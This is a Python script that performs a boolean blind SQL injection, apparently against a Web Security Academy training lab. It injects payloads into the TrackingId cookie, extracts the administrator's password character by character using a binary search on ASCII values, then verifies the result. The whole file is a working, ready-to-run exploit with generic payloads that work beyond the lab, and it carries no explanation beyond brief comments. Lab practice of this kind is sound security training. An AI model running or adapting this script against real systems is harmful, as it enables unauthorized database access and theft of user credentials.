import requests
import sys
from time import sleep

# Configuration
TARGET_URL = "https://0af200ca036bc1ab8070120800ba00f0.web-security-academy.net"
USERNAME = "administrator"
PASSWORD_LENGTH = 20

# Session to maintain cookies
session = requests.Session()

def check_condition(payload):
    """
    Send payload and check if condition is true
    Returns True if "Welcome back" appears in response
    """
    cookies = {
        'TrackingId': payload,
        'session': 'u80udMTGR71vnP6tth9guYeeSZ8ESNkE'  # Replace with your session cookie if needed
    }
    
    try:
        response = session.get(TARGET_URL, cookies=cookies, timeout=10)
        return "Welcome back" in response.text
    except Exception as e:
        print(f"Error: {e}")
        return False

def extract_password():
    """
    Extract password character by character using binary search
    """
    password = ""
    
    print(f"[*] Starting password extraction for user: {USERNAME}")
    print(f"[*] Password length: {PASSWORD_LENGTH}")
    print(f"[*] Target: {TARGET_URL}\n")
    
    for position in range(1, PASSWORD_LENGTH + 1):
        # Binary search for ASCII value
        min_ascii = 32
        max_ascii = 126
        
        while min_ascii <= max_ascii:
            mid_ascii = (min_ascii + max_ascii) // 2
            
            # Test if character ASCII value is greater than mid
            payload = f"9qjlPZleXEsUFAw1' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='{USERNAME}')>{mid_ascii}--"
            
            if check_condition(payload):
                # Character is greater than mid
                min_ascii = mid_ascii + 1
            else:
                # Character is less than or equal to mid
                max_ascii = mid_ascii - 1
            
            # Small delay to avoid rate limiting
            sleep(0.1)
        
        # The character's ASCII value
        char_ascii = min_ascii
        character = chr(char_ascii)
        password += character
        
        # Progress update
        print(f"[+] Position {position}/{PASSWORD_LENGTH}: '{character}' (ASCII: {char_ascii})")
        print(f"    Current password: {password}")
    
    return password

def verify_password(password):
    """
    Verify the extracted password is correct
    """
    print(f"\n[*] Verifying password: {password}")
    
    payload = f"xyz' AND (SELECT password FROM users WHERE username='{USERNAME}')='{password}'--"
    
    if check_condition(payload):
        print("[+] Password verification: SUCCESS!")
        return True
    else:
        print("[-] Password verification: FAILED!")
        return False

def main():
    print("="*60)
    print("Blind SQL Injection - Password Extractor")
    print("="*60)
    print()
    
    # Extract password
    extracted_password = extract_password()
    
    print("\n" + "="*60)
    print(f"[+] Extracted Password: {extracted_password}")
    print("="*60)
    
    # Verify password
    verify_password(extracted_password)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting...")
        sys.exit(0)
